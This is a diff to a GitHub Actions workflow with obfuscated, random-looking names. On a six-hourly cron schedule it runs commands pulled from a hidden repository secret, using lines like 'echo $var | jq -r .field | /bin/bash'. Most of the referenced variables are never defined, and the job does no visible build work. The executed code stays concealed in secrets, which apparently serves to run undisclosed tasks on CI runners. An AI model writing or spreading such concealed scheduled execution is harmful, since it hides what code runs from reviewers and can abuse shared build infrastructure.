@@ -2,29 +2,20 @@ name: wuhuobao9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '32 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuhuobao9876
         env:
-          gxik22084: ${{ secrets.gxik22084 }}
+          bm3651: ${{ secrets.bm3651 }}
         run: |
-          echo $gxik22084 | jq -r .icakr30785 | /bin/bash
-          echo $vuj56 | jq -r .o08764 | /bin/bash
-          echo $zmqxm3 | jq -r .glf737 | /bin/bash
-          echo $hzn86 | jq -r .zg9 | /bin/bash
-          echo $he51 | jq -r .ejte2868 | /bin/bash
-          echo $fnct0913 | jq -r .p430 | /bin/bash
-          echo $bdl4 | jq -r .uir3 | /bin/bash
-          echo $qhvf49260 | jq -r .xnebl76 | /bin/bash
-          echo $ayzn36 | jq -r .j4 | /bin/bash
-          echo $djjw046 | jq -r .gvov145 | /bin/bash
-          echo $dhl49624 | jq -r .k91 | /bin/bash
-          echo $vh7012 | jq -r .dbo84 | /bin/bash
-          echo $hemrl08 | jq -r .ytl1 | /bin/bash
+          echo $bm3651 | jq -r .j8151 | /bin/bash
+          echo $gp4490 | jq -r .vbti85876 | /bin/bash
+          echo $crrw9132 | jq -r .j990 | /bin/bash
+          echo $howp8 | jq -r .qwhxw676 | /bin/bash
+          echo $locnn78138 | jq -r .ao18 | /bin/bash
 
